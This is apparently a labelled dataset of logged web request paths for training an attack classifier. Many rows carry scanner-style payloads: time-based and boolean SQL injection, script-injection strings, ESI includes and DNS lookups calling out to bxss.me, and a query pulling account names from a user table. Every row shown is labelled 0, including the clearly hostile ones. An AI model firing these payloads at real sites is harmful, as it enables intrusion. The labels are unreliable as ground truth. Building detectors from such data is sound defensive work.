sentences	labels
xwdt/zjdt' and 2*3*8=6*8 and '0lgk'='0lgk/****/1.htm 	 0
xwzx/wp-content/*******/dzs-videogallery/admin/playlistseditor/popup.php?initer=whatava18642';alert(777)//645 	 0
aux/*******/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="">alert(/777/)&false_positives=without&sort=&asc=false&commit=search 	 0
qhly/******/2021/05/07/javascript:window.close(); 	 0
lcgg/********/javascript:void(0); 	 0
ztzl/xxczh1%' and 2*3*8=6*8 and 'pjfr'!='pjfr%/****/11.htm 	 0
xxgk/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/****/1081/list.html 	 0
newscenter/******/2021/10/27/javascript:window.close(); 	 0
jsearchfront/http://*******/t/fit.txt?.jpg/jcse/website.js 	 0
qhly/******/2012/07/03/javascript:dozoom(9) 	 0
newscenter/******/2021/12/14/javascript:window.close(); 	 0
ywly/****/jcgc%' and 2*3*8=6*8 and 'usup'!='usup%/ 	 0
en/*******/messagefromchairman/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
hdjl/*******/202012/t20201225_2539623.html 	 0
wp-content/******/enfold/archive.php 	 0
ztzl/*****/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
xwdt/****/czjs/gzdt/command/cmd 	 0
dcwj/****/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 0
ztpd/******/2021/12/18/javascript:void(0); 	 0
newscenter/******/2021/11/20/javascript:void(0); 	 0
wp-content/******/seowp/all-icons-page.php 	 0
was5/***/search?perpage=*/-->'""></iframe></script></style></title></textarea><script >alert(51550)</script> 	 0
index/****/flgw/""><script>alert(215)</script> 	 0
lz/******/2021/01/21/javascript:void(0); 	 0
jsearchfront/********/jcse/110105008056111/bxss.me/images/hanweb.css 	 0
lz/******/count/0006017/000000000000/window.location.href 	 0
ztpd/**********/ 	 0
xxgk/******/tjj/zfxxgkml_2127/hygq_2064/list'||'.html 	 0
module/*****/ckplayer/ckplayer.js/""><script>alert(6545)</script>?_=1630312392672 	 0
was5/***/search?perpage=20' waitfor delay '0:0:2&outlinepage=10&keyword=1&channelid=240998&searchword=1&page=10 	 0
xwzx/****/sgaj/201812/t20181208_'.gethostbyname(lc('hitis'.'inaqwueoff407.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(102).chr(75).chr(118).chr(74).'.html 	 0
en/**********/workbox.php?mode=addtolightbox&mediaid=""><script>alert(777)</script> 	 0
system/resource%' and 2*3*8=6*8 and '0otc'!='0otc%/**/newcalendar/calendar.js 	 0
news/********/sichouzhiluwenda?page=1'"()&%<acu><script>9112(9131)</script> 	 0
public/******/js/core/window.location.href,title:document.title,container:s.selector,fragment:e.fragment,timeout:e.timeout},window.history.replacestate(a.state,document.title));var 	 0
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15' or 6637=6637 and '1'='1&outlinepage=10 	 0
fr/******/idangerous.swiper.css/*/-->'""></iframe></script></style></title></textarea><script >alert(28137)</script> 	 0
qhly/******/2012/03/23/javascript:dozoom(9) 	 0
jsearchfront/********/jcse/http://bxss.me/t/fit.txt/16/images/style.css 	 0
newscenter/******/2013/10/21/011213243_02.shtml 	 0
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(4980)">?_=1630312232645 	 0
images/***/phone.js/"><script>alert(7522)</script> 	 0
module/'""()&%<acx><script >gejm(9387)</script>/********/jquery.ad-gallery.js 	 0
qtyz/******/index.php?tid=default&lid=en_uk&f_email="">alert(777) 	 0
xwzx/"".gethostbyname(lc(""hitgl"".""dqpwcwph4428a.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(113).chr(80).chr(110).chr(83).""/****/201812/t20181208_112298.html 	 0
newscenter/******/2021/11/18/javascript:window.print() 	 0
module/**********/visit.jsp?i_columnid[0]=exp'and/**/extractvalue(1,concat(char(126),md5(1105662730)))and'&i_columnid[1]==1&i_webid=1&type=1 	 0
was5/***/search?page=2&channelid=-1) or 3552=8536#&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 	 0
investors-garden/******/intermediary/2020-07-15/0'xor(if(now()=sysdate(),sleep(12),0))xor'z.html 	 0
socket.gethostbyname(""hithn"" ""iwcyplpfd267b.bxss.me."")[3].to_s) ""/***************/16/images/jquery.waterfall.js 	 0
swwj/******/2020/07/03/javascript:void(); 	 0
pic/*/00/59/50/595051_356657.jpg 	 0
lz/******/count/0006011/000000000000/window.location.href 	 0
wp-content/*******/dzs-videogallery/admin/playlistseditor/popup.php?initer=whatava18642';alert(777)//645 	 0
swld/******/2021/01/15/javascript:window.close(); 	 0
ldzc/*****/201610/t20161016_531.html?leader=薛香玲<esi:include src=""http://bxss.me/rpb.png""/> 	 0
socket.gethostbyname('hitqx' 'wcagrvvk4d467.bxss.me.')[3].to_s) '/****/7/12/art_35_234319.html 	 0
qhly/******/2021/12/20/javascript:dozoom(14) 	 0
qhly/******/2017/04/07/javascript:dozoom(12) 	 0
nbfw/********/loggedout.jsp?locale=""><script>alert(777)</script> 	 0
dcwj/****/admin/session_edit.php?page=resume_session.php" onmouseover=confirm(777)//&id=1 	 0
module/***/jpage/theme/simple'||'/css/jpage.css 	 0
zfld/******/2021/12/17/javascript:window.close(); 	 0
zwgk' and 2*3*8=6*8 and 'wppg'='wppg/****/bmjs/gdyx/ 	 0
e/******/viewclick/?addclick=1&classid=105&id=-1; waitfor delay '0:0:8.654' --  	 0
n42742/******/c1723818/content'||'.html 	 0
2021zt/******/2021/11/27/javascript:void(); 	 0
index/******/2019/09/20/javascript:void(0); 	 0
index/******/2021/04/04/javascript:void(); 	 0
vc/**/widgets/hanweb<esi:include src=""http://bxss.me/rpb.png""/>/ie6fixed/ie6fixed.js 	 0
index/******/2021/08/20/javascript:window.close(); 	 0
nbfw/cgi-bin/******/sharedobjmanager/policy_new/874/policytable?vdom="'/></script><script>alert(777)</script> 	 0
jsearchfront/********/jcse/110105008056111/16/images'||'/plugin/criteria/css.css 	 0
newscenter/******/2021/07/05/javascript:void(0); 	 0
zwgk/****/bmyjs/zzqzfzcbmyzstsjg/zzqscjgt/zzqgsj/\"javascript:void(0)\" 	 0
jsearchfront/**********/dimension.do?begin=&end=&eq=&oq=&p=1&pg=1&pos=&pq=&q=请输入关键词&searchid=1&tpl=16&websiteid=if(now()=sysdate(),sleep(15),0) 	 0
hdjl/****/202012/t20201225_2539623'""()&%<acx><script >cfsb(9973)</script>.html 	 0
zfld/******/2021/12/06/javascript:window.close(); 	 0
qtyz/****/gallery1.php?g_name=<script>alert(77729</script> 	 0
hdjl/****/202012/t20201225_2539623<esi:include src=""http://bxss.me/rpb.png""/>.html 	 0
swld/******/2021/12/17/javascript:window.print() 	 0
lcgg1/********/javascript:void(0); 	 0
zmhd/*****/hfswsj/zmhdyc'||'.html 	 0
was5/***/search?page=2&channelid=253477&searchword=1') and 7989=0840 and '1'='1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 	 0
xxgk'""()&%<acx><script >gva8(9864)</script>/*****/1088/1105/list.html 	 0
kjcx/****/gcdzyqzysjx/201501/t20150129_52362.html' and 'x'='y 	 0
xxgk/*****/1088/1105/list.html?new=0.4577770013510203<esi:include src=""http://bxss.me/rpb.png""/> 	 0
jsearchfront/********/jcse"" and 2*3*8=6*8 and ""u9rw""=""u9rw/110105008056111/16/images/hanweb.css 	 0
fxgg/********/javascript:void(0); 	 0
ywly/if(now()=sysdate(),sleep(15),0)/****/ 	 0
js/***/sa3/addholiday.do 	 0
xwzx/*******/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login="">alert(/777/)&assignee_login=&false_positives=without&sort=&asc=false&commit=search 	 0
module/*****/ckplayer/ckplayer.js/"><script>alert(3429)</script>?_=1630311881123 	 0
ru//***/f8kvl0wp/xhr_send?t=1632366085442 	 0
system/********/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/base64.js 	 0
images/*************/ajax_managed_services.php 	 0
xwdt/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/****/gzdt.htm 	 0
ru/**********/api.php?callback=jquery211027821724654516156_1466662510279}}1c027<script>alert(777)</script>cf2ea&type=get&mode=0&_=1466662510280 	 0
lcgg/********/javascript:void(0); 	 0
xxgk%' and 2*3*8=6*8 and 'iywl'!='iywl%/******/list.html 	 0
jsearchfront/template<esi:include src=""http://*******/rpb.png""/>/jcse/110105008056111/16/images/jquery.waterfall.js 	 0
lcgg/********/javascript:void(0); 	 0
lz/******/2021/09/14/javascript:void(0); 	 0
module/********/down.jsp?i_id=194814&colid=72' and 8101=3962 and 'wlqe'='wlqe 	 0
wzdt/config-browser/showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
swf/*************/zeroclipboard.swf?id="))}catch(e){}if(!self.a)self.a=!prompt(document.domain)//&width&height 	 0
icons/******/news/show/title/"><script>alert(777)</script>time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c 	 0
qywh/****/ and 1>1 	 0
cpsms/********/javascript:void(0); 	 0
xwdt/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/****/1.htm 	 0
xxgk/******/tjj'""()&%<acx><script >covi(9951)</script>/zfxxgkml_2127/jytabljg_2061/list.html 	 0
col/*******/t/xss.html? 	 0
col/*****/index.html/"><script>alert(5755)</script> 	 0
icons/****/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 0
kjcx/******/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user 	 0
xxgk/******/tjj%' and 2*3*8=6*8 and 'eqem'!='eqem%/zfxxgkml_2127/hygq_2064/list.html 	 0
lcgg1/********/javascript:void(0); 	 0
socket.gethostbyname('hitnp' 'sttuplrk424a2.bxss.me.')[3].to_s) '/**/images/autocomplete.css 	 0
module/*****/ckplayer/ckplayer.js/"><script>alert(1166)</script>?_=1630311769242 	 0
ru/*******/gvideos.php?gid=1 and 1=1 	 0
images/********/index.jsp?locale=""><script>alert(777)</script> 	 0
vc/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/***/easyui/themes/bootstrap/linkbutton.css 	 0
system/********/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/newcalendar/calendar.js 	 0
xwzx/****/2021_mtgz/202103/0'xor(if(now()=sysdate(),sleep(15),0))xor'z_271326.html 	 0
system/********/interview/room.jsp?wbinterviewid=1033%') or 2577=4433 and '%'='&owner=1707212448 	 0
zwgk/*****/5620/5642/index.html 	 0
qhly/******/2016/04/21/javascript:dozoom(9) 	 0
2016zt/******/2021/12/21/javascript:window.print() 	 0
prn/*****/index.php?o=panel&a=receiver.edit&id=alert(777) 	 0
ztsj/***/tjxx/202001/t20200121_1929212.html 	 0
lz/******/2021/10/25/javascript:void(0); 	 0
ddjs/****/202012/t20201214_264725.html' and 'x'='x 	 0
images//***********/phone.js 	 0
news/********/jishuchuangxin?page=1 and 3804=4490# 	 0
col/******/index.html/""><script>alert(4678)</script> 	 0
z/******/http://bxss.me/t/xss.html? 	 0
2013zt/***/js/jquery.kinslideshow-1.2.1.min.js/""><script>alert(34)</script> 	 0
system/resource%' and 2*3*8=6*8 and 'rrgp'!='rrgp%/**/formfunc.js 	 0
ywly/****/myjzgcsj//*/-->'""></iframe></script></style></title></textarea><script >alert(18406)</script> 	 0
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime%') or 6685=0380  	 0
gjcp/****/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
images'||'/***/hanweb.min.css 	 0
zfld/******/2015/08/17/javascript:window.close(); 	 0
wla/*********/daily_clickcount.json.jsp?callback=-1 or 9179=6545-- 	 0
gygj/************/index?search="">alert(/777/) 	 0
wla/*********/comul_total.json.jsp?callback=jquery171030196352313975305_1632325579271%') and 6385=6385  	 0
was5/***/search?perpage=*/-->'""></iframe></script></style></title></textarea><script >alert(89263)</script> 	 0
ywly/*****/index.html?continent=%') and 0965=0965  	 0
css/*********/jsp/ccmr/clientportal/login.jsp?strmessage=<img src=/ onerror="alert(777)"/> 	 0
system%' and 2*3*8=6*8 and '2rxr'!='2rxr%/********/js/formfunc.js 	 0
xwzx/****/202010/t20201028_255130.html and 1=1 	 0
index/******/2020/07/28/javascript:window.close(); 	 0
yqlj/******/mods/_standard/calendar/getlanguage.php?token=calendar_next<script>alert(777)</script>&pub=1 	 0
zwgk/****/bmyjs/zzqjcyxt/znxrmjcy/\"javascript:void(0)\" 	 0
index/******/2014/11/24/011565268.shtml 	 0
2017zt/******/2019/10/17/javascript:window.close(); 	 0
module/********/downfile.jsp?classid=0&filename=f8c2ed3e25ea4c269bf2e627a90b568a.docx and 2767=5833 	 0
index/****/javascript:void(); 	 0
xxgk/******/whgdj/?id=4001%' or 3082=3082 and '%%'='% 	 0
zfld/******/2021/08/25/javascript:window.print() 	 0
socket.gethostbyname(""hitld"" ""rwoptjvibaac2.bxss.me."")[3].to_s) ""/******/waterpull/pinterest_grid.js 	 0
2013zt/***/js/jquery-1.4a2.min.js/<img src="javascript:alert(50)"> 	 0
e/******/listinfo.php?mid='""()&%<acx><script >pkza(9131)</script> 	 0
xxgk/******/2013/http://bxss.me/t/fit.txt.html 	 0
ztpd/****/results.php?q='"--></style></script><script>alert(777)</script>&search=search&type=3 	 0
zwgk/****/bmyjs/zzqjcyxt/\"javascript:void(0)\" 	 0
index/******/2015/10/06/javascript:window.close(); 	 0
was5/***/search?page=2' or 5706=5706  	 0
inc/******/common/newaccount.aspx?btncancel=alert(777) 	 0
xq/****/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 0
xwzx/****/jt17/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
ldzc/*****/sz/202108/t20210806_http://bxss.me/t/xss.html? 	 0
xinanyanjiu/*************/nongchanpin/javascript:void(0) 	 0
e/******/showinfo/?classid='""()&%<acx><script >9wtx(9180)</script>&id=10317 	 0
ywly/*****/index.html?continent=' or 7230=7230  	 0
news/********/kuaguobinggou?*/-->'""></iframe></script></style></title></textarea><script >alert(04711)</script>=1 	 0
xwdt%' and 2*3*8=6*8 and 'ae9x'!='ae9x%/****/zjdt.htm 	 0
ldzc/*****/201903/t20190319_115324.html?leader="".gethostbyname(lc(""hitxn"".""ufcffjle32f81.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(113).chr(80).chr(121).chr(70)."" 	 0
zmhd/*****/hfswsj/'.gethostbyname(lc('hitjd'.'noxaxvoj4e841.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(119).chr(83).chr(102).chr(87).'.html 	 0
swld/******/2021/04/23/javascript:window.print() 	 0
gygj/*******/diary/new/submit.php 	 0
jsearchfront/********/jcse/110105008056111/16/bxss.me/style.css 	 0
was5/***/search?channelid=234439&orderby=relevance&perpage=24&searchword=1 and 9875=9875 	 0
swwj/******/2021/09/16/javascript:void(0); 	 0
xxgk/******/2014/bxss.me.html 	 0
art/****/12/25/art' and 2*3*8=6*8 and 'hnkm'='hnkm_37_224319.html 	 0
art/****/11/17/art_392_192567.html/"><script>alert(967)</script> 	 0
pic/*/10/01/15/10011527_998047.jpg 	 0
gygj/****/clgf/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
vc'||'/**/lib/easyui/plugins/jquery.panel.js 	 0
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448%') or 1446=2784  	 0
2016zt/******/2016/02/29/javascript:void(); 	 0
tupian/************/<img src="javascript:alert(184)"> 	 0
lz/******/2020/12/23/javascript:void(0); 	 0
wla/*********/daily_clickcount.json.jsp?callback=jquery171030196352313975305_1632325579270') or 0776=0776 -- 	 0
newscenter/******/more/201000000000000/0079/javascript:void(); 	 0
0'xor(if(now()=sysdate(),sleep(12),0))xor'z/****/ghby/gzdt.htm 	 0
was5/***/search/search?page=3&channelid=287219%' and 5067=5067 and '%'='&searchword=1&keyword=1&orderby=-docreltime&perpage=7&outlinepage=10 	 0
xwdt/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/*******/gzdt/1.htm 	 0
xwdt/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/********/gcjybz/1.htm 	 0
e/*******/ 	 0
index/******/2019/10/12/javascript:void(0); 	 0
skin/if(now()=sysdate(),sleep(15),0)/***/jquery.js 	 0
ywzzq/*******/gvideos.php?gid=1 and 1=1 	 0
xxgk/*****/1088/1110/"".gethostbyname(lc(""hitsq"".""ywffddkiaf087.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(97).chr(68).chr(122).chr(72)."".html 	 0
xinanyanjiu%' and 2*3*8=6*8 and 'p0xj'!='p0xj%/************/guzhiqihuo/ 	 0
z/191211-8/*****/543527'""()&%<acx><script >i44y(9309)</script>.css 	 0
fxgg/********/javascript:void(0); 	 0
2017zt/******/2017/11/04/javascript:window.print() 	 0
xxgk<esi:include src=""http://*******/rpb.png""/>/zzxxgk/tjj/zfxxgkml_2127/hygq_2064/list.html 	 0
xwdt/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/****/gzdt.htm 	 0
socket.gethostbyname('hitjq' 'zaycmiwga6fb9.bxss.me.')[3].to_s) '/*****/grouppic/jquery.ad-gallery.js 	 0
index/******/2021/01/21/013323672.shtml/<img src="javascript:alert(131)"> 	 0
xwdt/*****/15.htm 	 0
nul/****/search.php?query=""onmouseover=""alert(1); 	 0
newscenter/******/2013/09/20/011193115.shtml 	 0
xwzx/****/2021_mtgz/202103/t20210316_271472.html" and "x"="y 	 0
zfld/******/2021/12/12/javascript:window.close(); 	 0
zmhd/*****/'""()&%<acx><script >lnxe(9670)</script>/202109/t20210906_186411.html 	 0
gygj/****/2013_506/ and 1>1 	 0
zwgk/*******/fdzdgknr' and 2*3*8=6*8 and 'q5ei'='q5ei/ghxx.htm 	 0
newscenter/******/2021/12/20/javascript:void(); 	 0
xxgk/'""()&%<acx><script >dwaj(9905)</script>/****/1081/list.html 	 0
dcwj/******/common/signin.aspx?tbemailaddress=alert(777)returnurl=/******/common/default.aspx 	 0
xwdt/****/jhcw/0""xor(if(now()=sysdate(),sleep(12),0))xor""z.htm 	 0
lccp/********/javascript:void(0); 	 0
jsearchfront/********/jcse/110105008056111<esi:include src=""http://bxss.me/rpb.png""/>/16/images/plugin/selectpick/js.js 	 0
swwj/******/2021/04/06/javascript:void(0); 	 0
news/********/touzizixun?page=1 and 2634=2634# 	 0
newscenter/******/2020/09/13/javascript:window.print() 	 0
swld/******/2021/12/19/javascript:window.print() 	 0
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1 if(now()=sysdate(),sleep(6),0)/*'xor(if(now()=sysdate(),sleep(6),0))or'""xor(if(now()=sysdate(),sleep(6),0))or""*/&orderby=-docreltime&perpage=15&outlinepage=10 	 0
vc/********/ 	 0
icons/******/common/newaccount.aspx?btncreateaccount=alert(777) 	 0
